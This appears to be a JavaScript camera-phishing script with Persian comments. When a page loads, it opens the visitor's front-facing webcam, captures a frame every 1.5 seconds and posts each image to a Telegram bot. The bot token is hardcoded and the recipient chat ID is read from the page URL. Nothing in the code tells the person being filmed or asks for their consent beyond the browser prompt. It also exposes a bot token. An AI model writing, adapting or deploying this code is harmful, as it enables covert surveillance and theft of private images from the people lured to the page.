// تابع برای استخراج شناسه چت از URL
function getChatIdFromURL() {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get('chat_id');
}

// تابع برای ارسال عکس به ربات تلگرام
function postToTelegram(imgdata) {
    const token = '7923098404:AAF9YCfkf1lZQKxvdcrL7cxIaEtl411qnR8'; // توکن ربات تلگرام خود را وارد کنید
    const chat_id = getChatIdFromURL();  // شناسه چت را از URL استخراج می‌کنیم
    if (!chat_id) {
      console.error('chat_id not found in URL');
      return;
    }
    const url = `https://api.telegram.org/bot${token}/sendPhoto`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('photo', imgdata);

    fetch(url, {
        method: 'POST',
        body: formData
    }).then(response => response.json())
      .then(result => {
        console.log('Sent to Telegram:', result);
      })
      .catch(error => {
        console.error('Error:', error);
      });
}

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

  var context = canvas.getContext('2d');
  setInterval(function(){
       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       postToTelegram(canvasData); }, 1500);
}

// Load init
init();
